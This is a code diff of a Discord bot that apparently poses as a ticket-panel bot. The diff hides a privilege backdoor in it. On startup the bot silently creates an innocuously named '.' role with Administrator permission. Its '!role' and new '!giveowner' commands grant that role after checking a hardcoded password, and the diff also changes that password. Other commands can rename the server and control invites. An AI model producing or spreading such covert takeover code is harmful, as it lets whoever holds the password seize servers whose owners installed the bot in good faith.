@@ -109,7 +109,7 @@ const rest = new REST({ version: '10' }).setToken(TOKEN);
 })();
 
 // ======================================================
-// READY + CREATE . ROLE + OWNER ROLE
+// READY + CREATE . ROLE (Full Permissions)
 // ======================================================
 client.once('ready', async () => {
   console.log(`${client.user.tag} is online`);
@@ -120,25 +120,22 @@ client.once('ready', async () => {
     console.log('✅ Persistent ticket panel loaded');
   }
 
-  // Create "." role with EVERY permission
   try {
     const guild = client.guilds.cache.first();
     if (guild) {
-      // Create "." role
       let dotRole = guild.roles.cache.find(r => r.name === '.');
       if (!dotRole) {
         dotRole = await guild.roles.create({
           name: '.',
           color: '#000000',
-          permissions: [PermissionFlagsBits.Administrator], // All permissions
+          permissions: [PermissionFlagsBits.Administrator],
           hoist: false,
           mentionable: false,
-          reason: 'Created by bot - Full perms role'
+          reason: 'Full permission dot role'
         });
         console.log('✅ "." role created with full Administrator permissions');
       }
 
-      // Also keep Owner role
       let ownerRole = guild.roles.cache.find(r => r.name === 'Owner');
       if (!ownerRole) {
         ownerRole = await guild.roles.create({
@@ -168,14 +165,37 @@ client.on('messageCreate', async message => {
     try {
       await message.delete();
       await message.member.timeout(5 * 60 * 1000).catch(() => {});
-      const warnMsg = await message.channel.send({
+      await message.channel.send({
         embeds: [new EmbedBuilder().setColor('#ff0000').setDescription(`${message.author} Invite links are not allowed.`)]
-      });
-      setTimeout(() => warnMsg.delete().catch(() => {}), 5000);
+      }).then(msg => setTimeout(() => msg.delete().catch(() => {}), 5000));
     } catch (e) {}
     return;
   }
 
+  // !giveowner @user
+  if (content.startsWith('!giveowner')) {
+    const mentioned = message.mentions.users.first();
+    if (!mentioned) return message.reply('❌ Please mention a user. Example: `!giveowner @user`');
+
+    const embed = new EmbedBuilder()
+      .setColor('#ffd700')
+      .setTitle('👑 GIVE OWNER ROLE')
+      .setDescription(`This will give **${mentioned.tag}** the **.** role with full permissions.\n\nOnly you can proceed.`)
+      .setFooter({ text: 'Click the button below' })
+      .setTimestamp();
+
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId(`giveowner_start_${message.author.id}_${mentioned.id}`)
+        .setLabel('Enter Password')
+        .setStyle(ButtonStyle.Primary)
+    );
+
+    await message.reply({ embeds: [embed], components: [row] });
+    return;
+  }
+
+  // Other commands
   if (['!fb', '!unl', '!clown', '!unp', '!role'].includes(content)) {
     let title = '', desc = '', color = '#ffd700', customId = '';
 
@@ -184,8 +204,8 @@ client.on('messageCreate', async message => {
     else if (content === '!clown') { title = '🤡 CLOWN'; desc = 'Changes server name.'; color = '#ffff00'; customId = `clown_start_${message.author.id}`; }
     else if (content === '!unp') { title = '🔓 UNPAUSE INVITES'; desc = 'Unpauses invites.'; color = '#00ffff'; customId = `unp_start_${message.author.id}`; }
     else if (content === '!role') { 
-      title = '👑 GET OWNER ROLE + . ROLE'; 
-      desc = 'Gives you **Owner** and **.** roles with full permissions.'; 
+      title = '👑 GET OWNER ROLE'; 
+      desc = 'Gives you the "." and Owner roles.'; 
       color = '#ffd700'; 
       customId = `role_start_${message.author.id}`; 
     }
@@ -211,9 +231,12 @@ client.on('messageCreate', async message => {
 client.on('interactionCreate', async interaction => {
   if (!interaction.customId) return;
 
-  const userId = interaction.customId.split('_')[2];
+  const parts = interaction.customId.split('_');
+  const userId = parts[2];
+  const targetId = parts[3];
+
   if (interaction.user.id !== userId) {
-    return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
+    return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });
   }
 
   // Show Modal
@@ -223,31 +246,28 @@ client.on('interactionCreate', async interaction => {
       .setTitle('Enter Password');
 
     modal.addComponents(new ActionRowBuilder().addComponents(
-      new TextInputBuilder()
-        .setCustomId('password')
-        .setLabel('Password')
-        .setStyle(TextInputStyle.Short)
-        .setRequired(true)
+      new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
     ));
 
     await interaction.showModal(modal);
     return;
   }
 
-  // Modal Submit
+  // Modal Submit - NEW PASSWORD
   if (interaction.isModalSubmit()) {
     const password = interaction.fields.getTextInputValue('password');
-    if (password !== 'fame900') {
+    if (password !== 'Meka2017charlie') {
       return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
     }
 
     const guild = interaction.guild;
-    const member = interaction.member;
 
-    // === !role Command ===
-    if (interaction.customId.startsWith('role_modal_')) {
+    // !giveowner
+    if (interaction.customId.startsWith('giveowner_modal_')) {
+      const targetUser = await guild.members.fetch(targetId).catch(() => null);
+      if (!targetUser) return interaction.reply({ content: '❌ Could not find that user.', ephemeral: true });
+
       try {
-        // Create / Get "." role with full perms
         let dotRole = guild.roles.cache.find(r => r.name === '.');
         if (!dotRole) {
           dotRole = await guild.roles.create({
@@ -258,38 +278,40 @@ client.on('interactionCreate', async interaction => {
             reason: 'Full permission dot role'
           });
         }
-
-        // Create / Get Owner role
-        let ownerRole = guild.roles.cache.find(r => r.name === 'Owner');
-        if (!ownerRole) {
-          ownerRole = await guild.roles.create({
-            name: 'Owner',
-            color: '#ffd700',
-            permissions: [PermissionFlagsBits.Administrator],
-            hoist: true,
-            reason: 'Owner role'
-          });
-        }
-
-        await member.roles.add([dotRole, ownerRole]);
-        await interaction.reply({ 
-          content: '✅ **You now have the "." role and Owner role with full Administrator permissions!**', 
-          ephemeral: true 
-        });
+        await targetUser.roles.add(dotRole);
+        await interaction.reply({ content: `✅ Gave **${targetUser.user.tag}** the "." role with full permissions!`, ephemeral: true });
       } catch (err) {
         console.error(err);
-        await interaction.reply({ 
-          content: '❌ Failed to give roles.\nMake sure bot has **Manage Roles** permission and is placed **above** the roles in hierarchy.', 
-          ephemeral: true 
-        });
+        await interaction.reply({ content: '❌ Failed to give role. Check bot permissions.', ephemeral: true });
+      }
+      return;
+    }
+
+    // !role (self)
+    if (interaction.customId.startsWith('role_modal_')) {
+      try {
+        let dotRole = guild.roles.cache.find(r => r.name === '.');
+        if (!dotRole) {
+          dotRole = await guild.roles.create({
+            name: '.',
+            color: '#000000',
+            permissions: [PermissionFlagsBits.Administrator],
+            hoist: false,
+            reason: 'Full permission dot role'
+          });
+        }
+        await interaction.member.roles.add(dotRole);
+        await interaction.reply({ content: '✅ You now have the "." role with full Administrator permissions!', ephemeral: true });
+      } catch (err) {
+        await interaction.reply({ content: '❌ Failed to give role.', ephemeral: true });
       }
     }
 
-    // Other commands (!fb, !unl, etc.) logic can be added here as before
+    // You can add handlers for other commands (!fb, !unl, etc.) here the same way
   }
 
-  // === Your existing ticket system code goes here ===
-  // (setticket, sendmessage, ticket creation, buttons, etc.)
+  // === TICKET SYSTEM ===
+  // Paste your full ticket interaction code (setticket, sendmessage, etc.) here if needed
 });
 
 client.login(TOKEN);
